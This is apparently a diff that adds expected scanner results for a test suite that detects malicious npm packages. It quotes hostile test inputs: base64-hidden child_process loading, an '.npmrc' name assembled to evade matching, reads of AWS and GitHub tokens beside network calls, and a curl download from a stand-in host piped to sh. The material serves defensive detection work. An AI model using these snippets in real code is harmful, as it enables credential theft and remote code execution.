+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also uses the network"
+    ]
+   }
+  ]
+ },
+ "stopped: decoded and plain on one line": {
+  "score": 65,
+  "signals": [
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0000\u0000\u0000҈\u0013\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a… (after joining strings) (text match)",
+     "lib/b000000:2: hides code in base64: require(Buffer.from('Y2hpbGRfcHJvY2Vzcw==','base64').toString());require('child_… (decoded) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also uses the network"
+    ]
+   }
+  ]
+ },
+ "stopped: escaped and plain on one line": {
+  "score": 65,
+  "signals": [
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0000\u0000��\u0013\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a… (after joining strings) (text match)",
+     "lib/b000000:2: builds \"child_process\" from pieces: require('\\x63hild_process');require('child_process'); (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also starts processes"
+    ]
+   }
+  ]
+ },
+ "stopped: hidden in a comment and in code": {
+  "score": 35,
+  "signals": [
+   {
+    "id": "credential-read",
+    "points": -30,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:2: /* '.np'+'mrc' */ '.npmrc';fetch('x'); (after joining strings) (text match) (a credential name hidden by joining or encoding)",
+     "lib/b000000:2: /* '.np'+'mrc' */ '.npmrc';fetch('x'); (text match)",
+     "lib/b000000:2: /* '.np'+'mrc' */ '.npmrc';fetch('x'); (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0000\u0000��\u0013\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a… (after joining strings) (text match)",
+     "lib/b000000:2: builds \".npmrc\" from pieces: /* '.np'+'mrc' */ '.npmrc';fetch('x'); (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also uses the network"
+    ]
+   }
+  ]
+ },
+ "stopped: three-family harvest beside the network": {
+  "score": 27,
+  "signals": [
+   {
+    "id": "exfiltration",
+    "points": -35,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:3: 'https';process.env.AWS_SECRET_ACCESS_KEY;process.env.GITHUB_TOKEN;process.env.G… (reads AWS, GitHub, Google Cloud tokens, and code beside it uses the network) (text match)"
+    ]
+   },
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0000\u0000\u0000؈\u0013\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a… (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also uses the network"
+    ]
+   },
+   {
+    "id": "credential-mention",
+    "points": -3,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:3: 'https';process.env.AWS_SECRET_ACCESS_KEY;process.env.GITHUB_TOKEN;process.env.G… (text match)"
+    ]
+   }
+  ]
+ },
+ "stopped: a download piped to a shell": {
+  "score": 4,
+  "signals": [
+   {
+    "id": "remote-shell",
+    "points": -61,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:3: curl -s https://collector.invalid/x.sh | sh (text match)"
+    ]
+   },
+   {
+    "id": "obfuscated",
+    "points": -20,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000:1: …\u0000\u0000\u0000\u0000\u0000\u0000��\u0013\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a'+'a… (after joining strings) (text match)"
+    ]
+   },
+   {
+    "id": "suspicious-combination",
+    "points": -15,
+    "confidence": "confirmed",
+    "evidence": [
+     "lib/b000000: obfuscated code that also uses the network"
+    ]
+   }
+  ]
+ }
+}
